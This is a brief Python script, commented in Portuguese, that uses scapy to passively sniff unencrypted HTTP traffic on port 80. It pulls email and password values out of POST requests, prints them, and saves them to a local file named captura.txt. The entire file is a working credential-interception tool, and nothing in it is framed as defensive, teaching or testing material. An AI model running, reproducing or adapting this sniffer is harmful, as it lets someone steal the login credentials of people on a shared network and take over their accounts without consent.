import os
from scapy.all import sniff, Raw
from urllib.parse import unquote

ARQUIVO_SAIDA = "captura.txt"

def salvar_credenciais(email, senha):
    try:
        with open(ARQUIVO_SAIDA, "w", encoding="utf-8") as f:
            f.write(f"{email} {senha}\n")
            f.flush()               # força gravação no buffer
            os.fsync(f.fileno())     # força gravação no disco
    except:
        pass

def processar(pacote):
    if pacote.haslayer(Raw):
        try:
            data = pacote[Raw].load.decode(errors="ignore").lower()

            if "post" in data and ("email=" in data or "passwd=" in data):

                print("\n[🚨 DADOS CAPTURADOS 🚨]")
                print("-----------------------------------------")

                email = ""
                senha = ""

                if "email=" in data:
                    email_raw = data.split("email=", 1)[1].split("&")[0]
                    email = unquote(email_raw)
                    print(f"[EMAIL]  {email}")

                if "passwd=" in data:
                    pass_raw = data.split("passwd=", 1)[1].split("&")[0]
                    senha = unquote(pass_raw)
                    print(f"[PASSWD] {senha}")

                # salva imediatamente no arquivo
                salvar_credenciais(email, senha)

                print("-----------------------------------------\n")

        except Exception:
            pass

print("[*] Sniffer ativo. Aguardando POSTs decodificados...")
sniff(filter="tcp port 80", prn=processar, store=False)
